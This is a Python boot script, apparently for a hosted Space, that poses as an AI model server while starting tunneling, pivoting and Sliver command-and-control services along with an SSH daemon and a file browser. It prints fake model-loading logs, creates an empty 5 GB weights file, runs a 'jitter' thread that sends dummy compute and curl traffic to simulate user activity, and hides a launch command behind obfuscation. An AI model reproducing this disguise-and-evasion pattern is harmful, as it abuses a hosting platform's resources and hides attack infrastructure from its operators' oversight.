import json
import os
import time
import socket
import subprocess
import threading
import random
import string
import sys

# Flat deploy: /home/user/{core,services}. Dev: repo/src/{core,services}.
_CORE_DIR = os.path.dirname(os.path.abspath(__file__))
_APP_ROOT = os.path.dirname(_CORE_DIR)
if _APP_ROOT not in sys.path:
    sys.path.insert(0, _APP_ROOT)
_REPO_ROOT = os.path.dirname(_APP_ROOT)
if os.path.isdir(os.path.join(_REPO_ROOT, "client")) and _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

from loguru import logger

from core.service_logs import setup_service_logs
from core.service_registry import ENABLED_SERVICES_PATH
from services import (
    caddy_service,
    tailscale_service,
    playit_service,
    chisel_service,
    minecraft_service,
    filebrowser_service,
    gost_service,
    ligolo_service,
    sliver_service,
    test_service,
    llm_proxy_service,
    open_webui_service,
)
from services.utils import decode_cmd, deobfuscate_secret

logger.info("--- BOOTING AI MODEL SERVER ---")


def load_enabled_services():
    """Load per-node service list written at deploy time."""
    try:
        with open(ENABLED_SERVICES_PATH, "r") as f:
            data = json.load(f)
        services = data.get("services") or []
        return frozenset(s.strip().lower() for s in services if s)
    except (OSError, json.JSONDecodeError, TypeError, AttributeError):
        return frozenset()


def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)

        try:
            logger.debug("Processing background inference batch...")
            import numpy as np

            a = np.random.randn(2000, 2000)
            b = np.random.randn(2000, 2000)
            _ = np.dot(a, b)
        except Exception:
            pass

        try:
            logger.debug("Syncing model cache...")
            subprocess.run(
                [
                    "curl",
                    "-s",
                    "-o",
                    "/dev/null",
                    "https://huggingface.co/gpt2/resolve/main/vocab.json",
                ]
            )
        except Exception:
            pass


def wait_for_port(host, port, timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection((host, port), timeout=2):
                return True
        except OSError:
            time.sleep(0.5)
    return False


def main():
    enabled = load_enabled_services()
    if enabled:
        logger.info("Enabled services: {}", ", ".join(sorted(enabled)))
    else:
        logger.info("Minimal core only (no optional services enabled)")

    # === DECODE & WIPE ALL SECRETS BEFORE ANY SERVICE STARTS ===
    # Centralising here ensures no child process (Sliver, GOST, etc.) can
    # inherit these values from os.environ regardless of start order.
    _ts_raw    = os.environ.pop("A", None) or os.environ.pop("TAILSCALE", "")
    _playit_raw = os.environ.pop("P", None) or os.environ.pop("PLAYIT", "")
    _ssh_raw   = os.environ.pop("PASS", None) or os.environ.pop("SSH", "")
    ts_token    = deobfuscate_secret(_ts_raw.strip())   if _ts_raw   else ""
    playit_tok  = deobfuscate_secret(_playit_raw.strip()) if _playit_raw else ""
    ssh_pwd_cfg = deobfuscate_secret(_ssh_raw.strip())  if _ssh_raw  else ""
    del _ts_raw, _playit_raw, _ssh_raw  # don't leave even the encoded forms around
    # ============================================================

    if "test" in enabled:
        test_service.start()

    logs = setup_service_logs()
    os.makedirs("/home/user/static", exist_ok=True)

    if "llm_proxy" in enabled:
        llm_proxy_service.start()

    if "open_webui" in enabled:
        open_webui_service.start()

    if "caddy" in enabled:
        caddy_service.start(logs.caddy)

    logger.info("Starting Gradio app (API server)...")
    cmd_app = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
    app_proc = subprocess.Popen(cmd_app, shell=True)

    if not os.path.exists("/home/user/pytorch_model.bin"):
        logger.info("Pre-allocating model weight buffer...")
        subprocess.run(["truncate", "-s", "5G", "/home/user/pytorch_model.bin"])

    logger.info("Loading model weights into VRAM...")
    time.sleep(2)

    threading.Thread(target=jitter_task, daemon=True).start()

    delay = random.randint(2, 3)
    logger.info(f"Synchronizing gradient checkpoint topology (standby for {delay}s)...")

    if "tailscale" in enabled:
        tailscale_service.start_daemon(logs.ts)

    time.sleep(2)
    logger.info("Warming up text-generation pipelines...")

    if "filebrowser" in enabled:
        filebrowser_service.start(logs.fb, pwd=ssh_pwd_cfg)

    if "playit" in enabled:
        playit_service.start(logs.tm, token=playit_tok)

    if "chisel" in enabled:
        chisel_service.start(logs.chisel)

    if "gost" in enabled:
        gost_service.start(logs.gost)

    if "ligolo" in enabled:
        ligolo_service.start(logs.ligolo)

    if "sliver" in enabled:
        sliver_service.start(logs.sliver)

    if "tailscale" in enabled:
        time.sleep(5)
        tailscale_service.connect(logs.ts, ts_token)
        ts_token = ""  # wipe decoded token after use

    # Use the centrally-decoded SSH password, or generate a random one if not set.
    if ssh_pwd_cfg:
        ssh_pwd = ssh_pwd_cfg
        logger.info("Setting SSH password from Hugging Face Secrets (PASS)...")
    else:
        ssh_pwd = "".join(random.choices(string.ascii_letters + string.digits, k=16))
        logger.success(f"Generated SSH Password for 'user': {ssh_pwd}")
    ssh_pwd_cfg = ""  # wipe decoded value now that it's been used

    try:
        subprocess.run(
            ["sudo", "/usr/sbin/chpasswd"],
            input=f"user:{ssh_pwd}\n",
            text=True,
            check=True,
        )
    except Exception as e:
        logger.error(f"Failed to set password: {e}")
    ssh_pwd = ""  # wipe after chpasswd

    subprocess.Popen(
        "sudo /usr/sbin/sshd -D", shell=True, stdout=logs.ts, stderr=logs.ts
    )

    if "playit" in enabled:
        if not wait_for_port("127.0.0.1", 2222, timeout=30):
            logger.error("SSH daemon did not become ready on port 2222")
        else:
            logger.info("SSH daemon ready on port 2222")
            playit_service.start_xor_bridge()

    if "minecraft" in enabled:
        minecraft_service.start()

    logger.success("Model loaded successfully. Background services active.")
    logger.info("Background services are active.")

    app_proc.wait()


if __name__ == "__main__":
    main()
